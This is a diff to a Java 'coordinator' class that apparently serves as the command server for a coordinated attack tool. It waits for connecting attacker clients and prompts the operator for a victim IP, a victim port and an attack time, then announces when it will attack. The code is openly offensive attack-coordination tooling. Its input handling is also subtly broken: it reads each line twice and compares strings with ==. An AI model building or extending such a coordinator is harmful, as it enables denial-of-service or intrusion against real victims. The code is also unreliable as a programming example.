@@ -6,7 +6,7 @@ public class coordinator {
   public static int my_port = 2337;
   public static String victim_ip = "127.0.0.1";
   public static int victim_port = 1337;
-  public static String victim_time = "07:07:07";
+  public static String victim_time = "";
 
   public static Runnable spawnAttackServer(Socket socket) {
     Runnable attackerHandler = new Runnable() {
@@ -35,8 +35,7 @@ public class coordinator {
     return attackerHandler;
   }
 
-
-  public static void main(String[] args) throws IOException {
+  public static void startServer() {
     try {
       ServerSocket serverSocket = new ServerSocket(my_port);
        while (true) {
@@ -46,9 +45,29 @@ public class coordinator {
      } catch (Exception e) {
        System.out.println("Error.");
      }
+  }
 
-    //show the current number of attackers you have access to.
-    //get the input from the user (target IP address, attack time range, attack time)
-    //send that information out in a broadcast for attackers to get.
+  public static void getInput() {
+    Scanner reader = new Scanner(System.in);
+    System.out.print("Enter victim IP (default: " + victim_ip + ") : ");
+    if (!reader.nextLine().equals("")) {
+      victim_ip = reader.nextLine();
+    }
+    System.out.print("Enter victim port (default: " + victim_port + ") : " );
+    if (reader.nextLine() == "") {
+      victim_port = Integer.parseInt(reader.nextLine());
+    }
+    System.out.print("Enter time of attack (example: 06:57:22) : ");
+    victim_time = reader.nextLine();
+    if (victim_time.equals("")) {
+      System.out.println("Empty input. Quitting program.");
+      System.exit(-1);
+    }
+  }
+
+  public static void main(String[] args) throws IOException {
+    getInput();
+    System.out.println("Starting Server, will attack at: " + victim_time);
+    startServer();
   }
 }
